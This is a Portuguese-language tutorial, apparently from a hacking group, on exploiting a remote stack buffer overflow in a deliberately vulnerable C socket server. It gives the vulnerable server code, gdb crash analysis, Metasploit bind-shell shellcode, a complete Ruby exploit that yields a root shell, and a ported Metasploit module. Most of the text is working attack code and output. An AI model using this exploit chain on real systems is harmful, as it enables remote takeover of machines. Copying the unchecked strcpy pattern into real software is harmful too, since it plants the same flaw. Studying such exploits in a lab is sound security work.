@@ -1,0 +1,734 @@
+                                   .::[ exploração de um buffer overflow remoto ]::.
+
+
+Autor: FuRt3X
+email: blkhtc0rp@yahoo.com.br
+
+
+Neste tutorial irei mostrar como explorar uma simples falha remota de buffer overflow e criar nosso script exploit usando a linguagem de programação ruby, e portar esse exploit para o metasploit. Foi usada uma maquina virtural 
+VMware [ Slackware 8.1 ].
+
+
+O nosso servidor vulneravel escrito C  foi encontrado em um site na internet, você pode encontrar muitos exemplos por ai no google.
+
+
+
+[ servidor.c ]
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#define BUFFER_SIZE 1024 // Tamanho do buffer de recebimento
+#define BACKLOG 5       // Número de conexões na fila do servidor
+
+/* Protótipos de funções */
+/* Funções de processamento da mensagem recebida */
+void process(char *buffer);
+/* Função de saída em caso de erro */
+void quit_with_error(char * error_message);
+/* Rotina para fechamento das conexões e liberação dos sockets */
+void cleanup(int socket_descriptor, int incoming_socket);
+
+/* Ponto de entrada do programa */
+int main(int argc, char *argv[]) {
+        /* Descritor do socket servidor */
+        int socket_descriptor = -1;
+        /* Buffer de recebimento */
+        char buffer[BUFFER_SIZE];
+        /* Descritor do socket de conexão com cliente */
+        int incoming_socket;
+        /* Registro para armazenar endereço do servidor */
+        struct sockaddr_in my_address;
+        /* Registro para armazenar endereço do cliente */
+        struct sockaddr_in their_address;
+        /* Porta em que o servidor irá escutar */
+        int server_port = 0;
+        /* Inteiro para armazenar o número de btyes recebidos a cada chamada de read(2) */
+        int message_length;
+        /* Flag utilizada para ligar o reuso da porta do servidor */
+        int i_want_reusable_ports = 1;
+        /* Inteiro utilizado para armazenar o tamanho da estrutura sockaddr */
+        int length;
+        /* Inteiro utilizado para indexar o buffer de recebimento */
+        int index;
+
+        /* Checagem de parámetros do servidor */
+        if (argc!=2) {
+                fprintf(stderr,"Sinopse: %s <porta>\n", argv[0]);
+                exit(1);
+        }
+        /* Obtenção da porta a partir da linha de comando */
+        server_port = atoi(argv[1]);
+        /* Criação de um socket TCP */
+        socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
+
+        /* Checagem da criação do socket TCP */
+        if (socket_descriptor < 0) {
+                cleanup(socket_descriptor, incoming_socket);
+                quit_with_error("Não foi possível abrir socket TCP.\n");
+        }
+
+        /* Ligação do reuso na porta utilizada pelo socket */
+        if (setsockopt(socket_descriptor, SOL_SOCKET, SO_REUSEADDR, &i_want_reusable_ports, sizeof(int))== -1) {
+                cleanup(socket_descriptor, incoming_socket);
+                quit_with_error("Não foi possível tornar a porta do socket reusável.\n");
+        }
+
+        /* Montagem do registro que armazena o endereço da máquina executando o servidor */
+        my_address.sin_family = AF_INET;
+        my_address.sin_port = htons(server_port);
+        my_address.sin_addr.s_addr = INADDR_ANY;
+        memset(&(my_address.sin_zero), '0', 8);
+
+        /* Alocação da porta fornecida para o socket servidor */
+        if (bind(socket_descriptor, (struct sockaddr *) &my_address, sizeof(my_address)) < 0) {
+                cleanup(socket_descriptor, incoming_socket);
+                quit_with_error("Não foi possível alocar porta para o socket.\n");
+        }
+
+        /* Socket em modo de escuta */
+        if (listen(socket_descriptor, BACKLOG) == -1) {
+                cleanup(socket_descriptor, incoming_socket);
+                quit_with_error("Não foi possível colocar o socket em modo de escuta\n.");
+        }
+
+        length = sizeof(my_address);
+        printf("Servidor vulnerável iniciado e em escuta...\n");
+
+        /* Laço infinito em que o servidor receberá requisições */
+        while (1) {
+                /* Buffer de recebimento é zerado a cada nova conexão */
+                for (index = 0; index < BUFFER_SIZE; index++)
+                        buffer[index] = '\0';
+
+                /* Estabelecimento de conexão com o cliente */
+                if ((incoming_socket = accept(socket_descriptor, (struct sockaddr *) &their_address,&length)) == -1) {
+                        cleanup(socket_descriptor, incoming_socket);
+                        quit_with_error("Não foi possível aceitar conexão.\n");
+                }
+
+                /* Impressão de texto de depuração */
+                printf("Descritores dos sockets: Servidor: %d, Conexão: %d\n", socket_descriptor,incoming_socket);
+                printf("Conexão a partir de %s...\n", inet_ntoa(their_address.sin_addr));
+                send(incoming_socket, "Bem-vindo ao servidor vulnerável. Comporte-se...\n", 49, 0);
+                index = 0;
+
+                /* Leitura de mensagem enviada pelo cliente conectado */
+                while ((message_length = read(incoming_socket, buffer + index, 1)) > 0) {
+                        index += message_length;
+                        if (buffer[index - 1] == '\0')
+                                break;
+                }
+
+                /* Impressão de texto de depuração */
+                printf("Descritores dos sockets: Servidor: %d, Conexão: %d\n", socket_descriptor,incoming_socket);
+                printf("Mensagem recebida: %s\n", buffer);
+
+                /* Chamada da função de processamento da mensagem recebida */
+                process(buffer);
+                /* Fechamento da conexão com o cliente */
+                close(incoming_socket);
+        }
+        /* Liberação do socket servidor */
+        cleanup(socket_descriptor, incoming_socket);
+        return 0;
+}
+
+/* Processamento da mensagem do cliente.  Apenas efetua cópia da string para buffer local, que poderá ser utilizado por outra thread de execução */
+void process(char *buffer) {
+        char local_buffer[1024];
+        strcpy(local_buffer, buffer);   ------> funçao vulneravel!
+}
+
+void quit_with_error(char * error_message) {
+        fprintf(stderr, "%s", error_message);
+        exit(1);
+}
+
+void cleanup(int socket_descriptor, int incoming_socket) {
+        if (socket_descriptor != -1)  {
+                close(socket_descriptor);
+                close(incoming_socket);
+        }
+}
+
+
+#--------------------- EOF ---------------------------
+
+
+1- Compilando nosso servidor vulneravel e executando.
+
+pirata@slackware:/tmp$ gcc server.c -o servidor
+pirata@slackware:/tmp$ ./servidor 4000
+Servidor vulnerável iniciado e em escuta...
+
+
+1.1- Agora vamos conectar ao servidor vulneravel e ver o que acontece.
+
+pirate@0x90:~ > nc 192.168.77.128 4000
+Bem-vindo ao servidor vulnerável. Comporte-se...
+blah
+blah
+blah
+^C
+
+- Nao aconteceu nada porque o buffer reservado para mensagem é 1024 bytes, porém se mandarmos mais do que 1024 bytes que estao reservados pelo programa o programa quebra recebendo uma falha de segmentação. 
+
+
+
+ 
+pirate@0x90:~ > perl -e 'print "A" x 1028' | nc -vv 192.168.77.128 4000
+192.168.77.128: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.77.128] 4000 (?) open
+Bem-vindo ao servidor vulnerável. Comporte-se...
+^C sent 1028, rcvd 49
+
+
+
+pirata@slackware:/tmp$ ./servidor 4000
+Servidor vulnerável iniciado e em escuta...
+Descritores dos sockets: Servidor: 3, Conexão: 4
+Conexão a partir de 192.168.77.1...
+Descritores dos sockets: Servidor: 1094795585, Conexão: 4
+Mensagem recebida: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????}?@
+Segmentation fault
+
+
+
+1.2- Vamos usar o gdb e ver o que ocorre quando enviamos caracteres "A"  para o servidor buguento.
+
+- Iniciando gdb. 
+
+pirata@slackware:/tmp$ gdb servidor
+GNU gdb 5.2
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb) r 4000
+Starting program: /tmp/servidor 4000
+Servidor vulnerável iniciado e em escuta...
+
+
+
+- Mandando nossos caracteres "A".
+
+pirate@0x90:~ > perl -e 'print "A" x 1028' | nc -vv 192.168.77.128 4000
+192.168.77.128: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.77.128] 4000 (?) open
+Bem-vindo ao servidor vulnerável. Comporte-se...^C sent 1028, rcvd 49
+
+
+- gdb
+
+
+pirata@slackware:/tmp$ gdb servidor
+GNU gdb 5.2
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb) r 4000
+Starting program: /tmp/servidor 4000
+Servidor vulnerável iniciado e em escuta...
+Descritores dos sockets: Servidor: 5, Conexão: 6
+Conexão a partir de 192.168.77.1...
+Descritores dos sockets: Servidor: 1094795585, Conexão: 6
+Mensagem recebida: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????}?@
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbffff8ec in ?? ()
+(gdb) info all
+eax            0xbffff04c           -1073745844
+ecx            0xfffffba3           -1117
+edx            0xbffff8b6           -1073743690
+ebx            0x40141e58            1075060312
+esp            0xbffff454            0xbffff454
+ebp            0x41414141            0x41414141         
+esi            0x4001488c            1073825932
+edi            0xbffff914           -1073743596
+eip            0xbffff8ec            0xbffff8ec
+eflags         0x10292               66194
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0       0
+gs             0x0       0
+st0            0         (raw 0x00000000000000000000)
+st1            0         (raw 0x00000000000000000000)
+---Type <return> to continue, or q <return> to quit--- 
+
+
+- Analizando os registradores podemos ver que nao sobrescrevemos  o resgistrador EIP, sendo assim vamos enviar novamente nossos caracteres desta vez vamos acrescentar mais 4 bytes.
+
+
+
+pirate@0x90:~ > perl -e 'print "A" x 1032' | nc -vv 192.168.77.128 4000
+192.168.77.128: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.77.128] 4000 (?) open
+Bem-vindo ao servidor vulnerável. Comporte-se...^C sent 1032, rcvd 49
+
+
+
+pirata@slackware:/tmp$ gdb servidor
+GNU gdb 5.2
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb) r 4000
+Starting program: /tmp/servidor 4000
+Servidor vulnerável iniciado e em escuta...
+Descritores dos sockets: Servidor: 5, Conexão: 6
+Conexão a partir de 192.168.77.1...
+Descritores dos sockets: Servidor: 1094795585, Conexão: 6
+Mensagem recebida: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}?@
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info register eip
+ eip            0x41414141       0x41414141
+(gdb)
+
+
+- Agora o registrador EIP foi sobescrito sabemos que com 1032 bytes( temos tamanho mais do que suficiente para injetar nosso shellcode) conseguimos sobrescrever o registrador eip o que temos que fazer agora e encontrar nosso endereço de retorno que queremos colocar no EIP.
+
+
+
+
+2 - Encontrando o endereço de retorno usando um falso endereço de retorno 0x41414141.
+
+- Vamos mandar  nops + nosso metasploit shellcode + nosso  endereço falso e usaremos um dos endereços que contem nossos nops como endereço de retorno fazendo com que os nops nos levem ao nosso payload.
+
+[ nops ] + [ payload ] + [ retorno ] 
+
+
+- Criando nosso payload
+
+pirate@0x90:/pentest/exploits/framework3 > ./msfpayload linux/x86/shell_bind_tcp LPORT=5555 C
+/*
+ * linux/x86/shell_bind_tcp - 78 bytes
+ * http://www.metasploit.com
+ * AppendExit=false, PrependChrootBreak=false,
+ * PrependSetresuid=false, PrependSetuid=false, LPORT=5555,
+ * RHOST=, PrependSetreuid=false
+ */
+unsigned char buf[] =
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x5b\x5e\x52\x68\xff\x02\x15\xb3\x6a\x10\x51\x50\x89\xe1\x6a"
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+"\x0b\xcd\x80";
+
+
+
+- Sabemos que 1032 bytes sao necessarios para o EIP ser sobrescrito entao prescisamos saber a quantidade certa de nops para completar nosso buffer e reservar 4 bytes para nosso endereço de retorno.
+
+- Com um rapido calculo temos a quantidade necessaria de nops.
+
+pirate@0x90:~ > echo $((1032 - 78 - 4))
+950
+
+-Agora temos a quantidade exata de nops que iremos enviar vamos montar nosso exploit.
+
+
+---- slack.rb -----
+
+#!/usr/bin/ruby
+#
+# 
+# 
+# 
+#
+#
+#
+require 'socket'
+
+host = ARGV[0]
+porta = ARGV[1]
+
+shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"+
+"\x5b\x5e\x52\x68\xff\x02\x15\xb3\x6a\x10\x51\x50\x89\xe1\x6a"+
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"+
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"+
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"+
+"\x0b\xcd\x80"
+
+nops = "\x90" * 950
+ret = [0x41414141].pack('V')
+
+
+#  [ nops 950 bytes ] + [ payload 78 bytes ] + [ retorno 4 bytes ] = 1032
+exploit = nop << shellcode << ret
+
+s = TCPSocket.new(host, porta)
+s.print(exploit)
+s.close
+
+puts "buffer mandado....."
+
+
+
+
+-Antes de enviarmos o buffer temos que abilitar o core dumping para que possamos analizar nossos nops usando o arquivo core gerado e o gdb.
+
+root@slackware:/tmp# ulimit -c unlimited
+
+-Executamos o servidor e mandamos nosso buffer para que seja gerado o arquivo core.
+
+pirate@0x90:~ > ruby slack.rb 192.168.77.128 4000
+buffer mandado.....
+
+
+root@slackware:/tmp# ./servidor 4000
+Servidor vulnerável iniciado e em escuta...
+Descritores dos sockets: Servidor: 3, Conexão: 4
+Conexão a partir de 192.168.77.1...
+Descritores dos sockets: Servidor: -2134045776, Conexão: 4
+Mensagem recebida: ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1???SCSj???f[^Rh??jQP??jfX?A??fC?f?Yj?XIy?h//shh/bin??PS???
+                    AAAA}?@
+Segmentation fault (core dumped)
+
+
+- Agora temos que analizar nosso arquivo core e procurar pelos nops.
+
+root@slackware:/tmp# gdb -c core
+GNU gdb 5.2
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux".
+Core was generated by `./servidor 4000'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? ()
+(gdb) x/200x $esp
+0xbffff4b4:     0x4003d17d      0xbfff0002      0x00000004      0x00000000
+0xbffff4c4:     0x00000000      0x4000f2e2      0x400143ac      0x00000408
+0xbffff4d4:     0x00000010      0x00000001      0xffffffff      0x00000fa0
+0xbffff4e4:     0x46e10002      0x014da8c0      0xc011079f      0xf3cbe000
+0xbffff4f4:     0xa00f0002      0x00000000      0x30303030      0x30303030
+0xbffff504:     0x00000004      0x90909090      0x90909090      0x90909090     
+0xbffff514:     0x90909090      0x90909090      0x90909090      0x90909090           
+0xbffff524:     0x90909090      0x90909090      0x90909090      0x90909090       
+0xbffff534:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff544:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff554:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff564:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff574:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff584:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff594:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff5a4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff5b4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff5c4:     0x90909090      0x90909090      0x90909090      0x90909090
+---Type <return> to continue, or q <return> to quit---
+0xbffff5d4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff5e4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff5f4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff604:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff614:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff624:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff634:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff644:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff654:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff664:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff674:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff684:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff694:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6a4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6b4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6c4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6d4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff6e4:     0x90909090      0x90909090      0x90909090      0x90909090
+---Type <return> to continue, or q <return> to quit---
+0xbffff6f4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff704:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff714:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff724:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff734:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff744:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff754:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff764:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff774:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff784:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff794:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff7a4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff7b4:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff7c4:     0x90909090      0x90909090      0x90909090      0x90909090
+
+
+-Analizando nosso arquivo core podemos ver que nossos nops na memoria agora com base nesses nops podemos usar quaquel endereço totalmente sobrescrito contendo nops que ele nos levara a nosso payload irei usar este endereço 0xbffff644 que se encontra no meio dos nosso nops.
+
+
+
+2.2 - Contruindo o exploit final e explorando a vulnerabilidade.
+
+
+
+------- slack.rb ---------
+
+
+#!/usr/bin/ruby
+#
+# ######################
+# .::[ blk ht c0rp ]::.
+# ######################
+# exploit sevidor vulneravel
+# pirate@0x90:~ > ruby slack.rb 192.168.77.128 4000
+# [+] exploitando....
+# [+] blk ht c0rp...
+# id
+# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+# 
+########################
+require 'socket'
+
+host = ARGV[0]
+porta = ARGV[1]
+
+if ARGV.length != 2
+     puts "#{$0} vitima porta"
+     exit
+end
+
+shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"+
+"\x5b\x5e\x52\x68\xff\x02\x15\xb3\x6a\x10\x51\x50\x89\xe1\x6a"+
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"+
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"+
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"+
+"\x0b\xcd\x80"
+
+nops = "\x90" * 950
+ret = [0xbffff644].pack('V')
+
+
+#  [ nops 950 bytes ] + [ payload 78 bytes ] + [ retorno 4 bytes ] = 1032
+exploit = nop << shellcode << ret
+
+s = TCPSocket.new(host, porta)
+s.print(exploit)
+s.close
+
+puts "[+] exploitando...."
+sleep 2
+puts "[+] blk ht c0rp..."
+
+system("nc #{host} 5555")
+
+
+#--------------- EOX --------------------
+
+
+
+
+root@slackware:/tmp# ./servidor 4000
+Servidor vulnerável iniciado e em escuta...
+
+
+pirate@0x90:~ > ruby slack.rb 192.168.77.128 4000
+[+] exploitando....
+[+] blk ht c0rp...
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+uname -a
+Linux slackware 
+echo pwned!
+pwned!
+
+
+
+root@slackware:/tmp# ./servidor 4000
+Servidor vulnerável iniciado e em escuta...
+Descritores dos sockets: Servidor: 3, Conexão: 4
+Conexão a partir de 192.168.77.1...
+Descritores dos sockets: Servidor: -2134045776, Conexão: 4
+Mensagem recebida: ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1???SCSj???f[^Rh??jQP??jfX?A??fC?f?Yj?XIy?h//shh/bin??PS???
+                    D???}?@
+
+
+
+3 - Portando exploit para metasploit v3.3.4.
+
+-Exploramos a falha temos todas as informações sobre como explorar-la agora podemos facilmente adptar nosso exploit para o metasploit.
+
+
+
+------ slackware_servidor_vulneravel.rb --------
+
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+        Rank = GreatRanking    # ;) 
+
+	include Exploit::Remote::Tcp
+
+              # Informações basicas do exploit
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Exploit para servidor vulneravel',
+			'Description'    => %q{
+                                                            Exploit para buffer overflow remoto no servidor vulneravel.
+			},
+			'Author'                => 'FuRt3X',
+			'Version'               => '$Revision: -1 $',
+                                          'References'	 =>
+				[
+					[ 'URL', 'http://naoexiste.com.br' ],
+				],
+			                'Payload'        =>
+				{
+					'Space'        => 500,             # aqui eu reservei 500 bytes e nao 78 para que  
+					'BadChars'  => "\x00",             # possamos ter compatibilidade com os payloads
+				},
+                                           'Platform'       => 'linux',
+                                           'Arch'	    => ARCH_X86,
+                                           'Privileged'     => false,
+                                           'Targets'        => 
+				[
+					
+					[ 
+						'Linux Slackware 8.1', 
+						{
+							'Platform' => 'linux',
+							'Ret'      => 0xbffff644      # nosso endereço de retorno
+						}
+					],
+				],
+			'DefaultTarget' => 0))
+                
+
+                register_options(
+			[
+				Opt::RPORT(4000)     # aqui registrei a porta 4000 como padrão 
+			],
+			self.class
+		)
+	end
+
+
+            
+              
+	def exploit
+		connect
+                                 
+                                 # aqui ele vai  imprimir no console quando o exploit for executado o tamanho do payload em bytes
+                                 # e o nome da target  "o alvo!" ;)
+    	                   
+                                 print_status("Sending #{payload.encoded.length} byte payload...")
+                                 print_status("Blk ht c0rp") 
+                                 print_status("Exploiting #{target.name}....")
+
+                	    # Envia 528 nops + payload 500 bytes + 4 bytes do enderço de retorno 0xbffff644
+
+                                buffer  = "\x90" * 528
+                                buffer += payload.encoded
+             	                  buffer += [ target.ret ].pack('V')
+
+               	    # Conecta ao server e envia o buffer!
+		    sock.put(buffer)
+		
+                                handler
+                         disconnect
+	end
+
+end
+
+
+
+--------------------- EOX -----------------------
+
+
